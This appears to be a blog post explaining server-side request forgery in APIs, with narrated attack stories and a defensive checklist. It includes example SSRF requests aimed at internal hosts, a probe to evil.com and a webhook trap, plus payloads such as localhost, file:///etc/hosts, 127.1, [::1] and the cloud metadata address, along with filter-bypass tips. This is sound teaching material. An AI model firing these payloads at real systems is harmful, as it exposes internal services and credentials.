
---

# API-07-2023 Server-Side Request Forgery: The Silent API Killer You Didn’t See Coming

While you sip your coffee and debug your API, an attacker slips in a line of code, and suddenly your server leaks secrets. This is **Server-Side Request Forgery (SSRF)**—a sneaky, dangerous flaw listed in the OWASP API Security Top 10 for 2023. Let's break down how it works and how to stop it.

## SSRF: The Basics (or How Your Server Becomes a Puppet)

SSRF is what happens when your application trusts a user-supplied URL a little too much. Say your API lets users specify a resource to fetch—like a profile picture or an external data feed. Seems harmless, right? But if you don’t double-check that URL, an attacker can hijack your server to do their bidding. Think of it as handing over the keys to your server’s address book—except now they’re calling up internal systems, snooping through private data, or worse.

There are two types of SSRF you need to know about:

- **In-Band SSRF**: The server fetches the attacker’s resource and hands the result right back. It’s like asking your server to grab a file and watching it cheerfully deliver your admin password.
- **Blind SSRF**: The server makes the request, but keeps the response to itself. The attacker doesn’t see the loot—they have to set traps elsewhere to confirm the hit.

Either way, SSRF turns your server into an unwitting accomplice. And the stakes? Leaked credentials, internal network scans, or even a full-blown takeover.

---

## A Tale of Two Attacks

Let’s bring this to life with a couple of stories.

### Story 1: The In-Band Heist
Imagine an API for a photo-sharing app. Users submit URLs to upload images from remote servers:

```
POST /api/v1/photos/upload
Host: photos.example.com
Content-Type: application/json

{
  "image_url": "https://usergallery.com/photo123.jpg"
}
```

The server fetches the image, processes it, and all’s well. But then an attacker steps in:

```
POST /api/v1/photos/upload
Host: photos.example.com
Content-Type: application/json

{
  "image_url": "http://internal-db.example.com/admin-keys"
}
```

The server, trusting as ever, grabs the data from `internal-db.example.com`—a private system—and sends it back:

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "image_data": "API_KEY=SuperSecret123"
}
```

The attacker just scored a golden ticket, all because the server didn’t ask, *“Hey, should I really be fetching this?”*

### Story 2: The Blind Ambush
Now, let’s switch gears. A logistics API lets clients check shipment statuses via external APIs:

```
POST /api/v1/shipments/status
Host: logistics.example.com
Content-Type: application/json

{
  "tracking_api": "https://shipper.com/api/track/xyz"
}
```

An attacker tests the waters:

```
POST /api/v1/shipments/status
Host: logistics.example.com
Content-Type: application/json

{
  "tracking_api": "https://evil.com/probe"
}
```

The server hits `evil.com`, but the response is empty:

```
HTTP/1.1 200 OK
Content-Type: application/json

{}
```

No data, no problem—except the attacker’s running a server at `evil.com`. They check their logs and see a hit from `logistics.example.com`. Bingo! They’ve confirmed Blind SSRF and can now escalate their attack.

---

## Why SSRF Keeps Me Up at Night

SSRF isn’t just a bug—it’s a gateway to chaos. Here’s what it can unleash:

- **Data Leaks**: Think cloud metadata (e.g., AWS’s infamous `169.254.169.254`), internal APIs, or config files.
- **Network Recon**: Mapping out your private network like a digital burglar casing a house.
- **Proxy Abuse**: Using your server to mask attacks on other targets.
- **System Overload**: Flooding internal services with junk requests.

For security researchers, SSRF is a goldmine. Bug bounty platforms like HackerOne dish out big rewards for high-impact SSRF finds—sometimes thousands of dollars if you can prove access to sensitive systems.

---

## How Attackers Pull It Off

Exploiting SSRF is like playing a game of cat and mouse. Here’s their playbook:

1. **Probe with Payloads**: They’ll try URLs like `http://localhost`, `http://127.0.0.1:8080`, or even `file:///etc/hosts` to see what sticks.
2. **Dodge Filters**: If you block `localhost`, they might use `127.1` (same thing, sneakier syntax) or IPv6 trickery like `http://[::1]`.
3. **Set Traps**: For Blind SSRF, they’ll use tools like **Webhook.site** or **ngrok** to generate a unique URL and watch for hits.

Take this Blind SSRF example:

```
POST /api/v1/shipments/status
Host: logistics.example.com
Content-Type: application/json

{
  "tracking_api": "https://xyz123.webhook.site"
}
```

The attacker sends it, refreshes their Webhook dashboard, and—voilà—a request from the target server pops up. Game on.

---

## Locking the Door: How to Stop SSRF

Good news: SSRF is beatable. Here’s your defense strategy:

### 1. Trust No One
- Only allow requests to a shortlist of approved domains (e.g., `shipper.com`, `gallery.com`). No exceptions.
- Strip user input down to parameters—don’t let them control the whole URL.

### 2. Build a Fortress
- Block access to internal networks (e.g., `10.0.0.0/8`, `192.168.0.0/16`) at the application *and* network level.
- Turn off HTTP redirects—they’re a backdoor for bypassing your rules.

### 3. Double-Check Everything
- Use a battle-tested URL parser (e.g., Go’s `net/url`, Ruby’s `URI`) to catch malformed or sneaky inputs.
- Sanitize ruthlessly. If it doesn’t look like `https://[approved-domain]/...`, reject it.

### 4. Stay Stealthy
- Never echo raw responses back to users. Process the data and send only what’s needed.
- Log every outbound request—spotting `http://localhost` in your logs is a red flag.

### Pro Tip: Test Like an Attacker
Run your own SSRF checks during development. Tools like **Burp Suite** or a simple `curl` to a test endpoint can reveal weak spots before the bad guys do.

---

## A Cautionary Tale

In 2019, a popular SaaS platform got hit with an SSRF flaw. Attackers fed a customer-facing API a URL pointing to AWS metadata (`http://169.254.169.254/latest/meta-data/`). The server happily fetched it, exposing IAM credentials that unlocked the company’s entire cloud infrastructure. The fix took weeks—and a hefty PR hit. Lesson? A little validation goes a long way.

---

## Dig Deeper: Resources for the Curious

Want more? Here’s your SSRF toolkit:
- [OWASP SSRF Guide](https://owasp.org/www-project-api-security/)
- [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger’s SSRF Labs](https://portswigger.net/web-security/ssrf)
- [HackerOne SSRF Reports](https://hackerone.com/hacktivity?query=ssrf)

---

## The Takeaway

SSRF is the kind of vulnerability that sneaks up on you—quiet, unassuming, and devastating if ignored. It’s not just a coding mistake; it’s a trust issue. Every time your server reaches out to a URL, it’s rolling the dice—unless you’ve stacked the odds in your favor with smart design and ironclad validation.

So, next time you’re building an API, channel your inner skeptic. Ask: *“What if this input’s a lie?”* Then code like your server’s life depends on it—because it just might.

Got thoughts? Drop them below—I’d love to swap war stories or debug tips. If this resonated, share it on Medium or with your team. Let’s keep the API world a little safer, one request at a time.

---
